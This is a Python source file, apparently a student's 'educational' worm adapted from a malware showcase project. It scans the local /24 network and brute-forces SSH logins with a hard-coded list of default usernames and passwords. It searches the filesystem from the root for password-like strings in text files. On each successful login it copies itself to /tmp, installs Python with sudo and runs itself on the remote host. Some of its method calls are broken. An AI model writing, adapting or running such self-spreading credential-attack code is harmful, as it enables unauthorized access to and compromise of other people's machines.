# before we start: I Made this Project for education and to suprise my Professors (I "study" it so not in the bad way lol)
# Just be carefull and yea. Credits: I used snippets from malware_showcase by PatrikH0lop and overwork them a little bit

# Version 1.0
# Copyright: WeepingAngel


import os
import sys
from importlib.metadata import requires
from ipaddress import ip_address
import subprocess
import scp
import paramiko
import re
import socket
import platform
from pycparser.c_ast import Return




class syscalls:
    def detect_os_and_package_manager(self):
        current_os = platform.system()
        python_installed = False
        python_version = None

        if current_os == "Windows":
            return "Windows Detected" # i may replace it with the windows loader

        elif current_os == "Linux":
            package_manager = None
            if os.path.exists('/usr/bin/apt'):
                package_manager = 'apt'
            elif os.path.exists('/usr/bin/yum'):
                package_manager = 'yum'
            elif os.path.exists('/usr/bin/dnf'):
                package_manager = 'dnf'
            elif os.path.exists('/usr/bin/pacman'):
                package_manager = 'pacman'
            elif os.path.exists('/usr/bin/zypper'):
                package_manager = 'zypper'

            try:
                result = subprocess.run(["python3", "--version"], check=True, stdout=subprocess.PIPE,
                                        stderr=subprocess.PIPE)
                python_installed = True
                python_version = result.stdout.decode().strip()
            except (subprocess.CalledProcessError, FileNotFoundError):
                python_installed = False

            return current_os, package_manager, python_installed, python_version
        else:
            return "Invalid OS", None, False, None



class Spreader:
    def __init__(self, network_adress):
        self._network = network_adress

    @property
    def network(self):
        return self._network

    @network.setter
    def network(self, new_network):
        self._network = new_network

    @property
    def thenest(self):
        common_user_passwords = [
            ('root', 'root'),
            ('admin', 'admin'),
            ('user', 'user'),
            ('guest', 'guest'),
            ('test', 'test'),
            ('admin', 'password'),
            ('root', 'toor'),
            ('administrator', 'administrator'),
            ('ubuntu', 'ubuntu'),
            ('vagrant', 'vagrant'),
            ('pi', 'raspberry'),
            ('test', '123456'),
            ('admin', '123456'),
            ('root', '123456'),
            ('user', 'password'),
            ('guest', 'password'),
            ('mysql', 'mysql'),
            ('ftp', 'ftp'),
            ('apache', 'apache'),
            ('postgres', 'postgres'),
            ('oracle', 'oracle'),
            ('admin', 'admin123'),
            ('root', 'password'),
            ('user', '1234'),
            ('root', 'letmein'),
            ('root', '12345'),
            ('user', 'qwerty'),
            ('admin', 'admin2023'),
            ('root', 'root123'),
            ('admin', 'welcome'),
            ('root', '123qwe'),
            ('user', 'asdfgh'),
            ('guest', 'guest123')
        ]
        PASSWORD_PATTERN = re.compile(r'[A-Za-z0-9!@#$%^&*()_+=-]{8,}')
        search_files = directory="/"
        for root, dirs, files in os.walk(directory):
            for file in files:
                if file.endswith(".txt"):
                    file_path = os.path.join(root, file)
                    try:
                        with open(file_path, 'r', encoding='utf-8', errors='ingnore' ) as f:
                            content = f.read()
                            matches = PASSWORD_PATTERN.findall(content)
                            if matches:
                                for match in matches:
                                    passwordstrings = match
                                    return passwordstrings
                    except Exception as e:
                        return common_user_passwords
                else:
                    return common_user_passwords

    def generate_adresses_on_network(self):
        network = self.network.split('.')
        for host in range(1, 256):
            network[-1] = str(host)
            yield '.'.join(network)

    def spreading_mashine(self):
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        for remote_address in self.generate_adresses_on_network():
            for user, passw in self.thenest:
                try:
                    ssh.connect(remote_address, port=22, username=user, password=passw, timeout=10)

                    with scp.SCPClient(ssh.get_transport()) as scp_client:
                        try:
                            script_path = sys.argv[0]
                            remote_path = f"/tmp/{os.path.basename(script_path)}"
                            scp_client.put(script_path, remote_path)
                            os_type, package_manager, python_installed, python_version = syscalls.detect_os_and_package_manager()
                            if os_type == "Windows":
                                return None
                            elif os_type == "Linux":
                                if not python_installed:
                                    if package_manager == "apt":
                                        ssh.exec_command("sudo apt update && sudo apt install -y python3")
                                        ssh.exec_command("sudo apt update && sudo apt install -y python3-pip")
                                    elif package_manager == "yum":
                                        ssh.exec_command("sudo yum install -y python3")
                                        ssh.exec_command("sudo yum install -y python3-pip")
                                    elif package_manager == "dnf":
                                        ssh.exec_command("sudo dnf install -y python3")
                                        ssh.exec_command("sudo dnf install -y python3-pip")
                                    elif package_manager == "pacman":
                                        ssh.exec_command("sudo pacman -Syu python")
                                        ssh.exec_command("sudo pacman -Syu python3-pip")
                                    elif package_manager == "zypper":
                                        ssh.exec_command("sudo zypper install -y python3")
                                        ssh.exec_command("sudo zypper install -y python3-pip")
                            stdin, stdout, stderr = ssh.exec_command("pip3 install scp paramiko")
                            stdin, stdout, stderr = ssh.exec_command(f"python3 {remote_path}")
                            print(stdout.read().decode())
                            print(stderr.read().decode())
                        except Exception as e:
                            return None
                except Exception as e:
                    return None
        ssh.close()

    def get_local_ip(ip):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            s.close()
            return ip
        except Exception as e:
            return None





if __name__ == '__main__':
    syscalls.detect_os_and_package_manager()
    ip = Spreader.get_local_ip()
    spread = Spreader(ip)
    Spreader.spreading_mashine()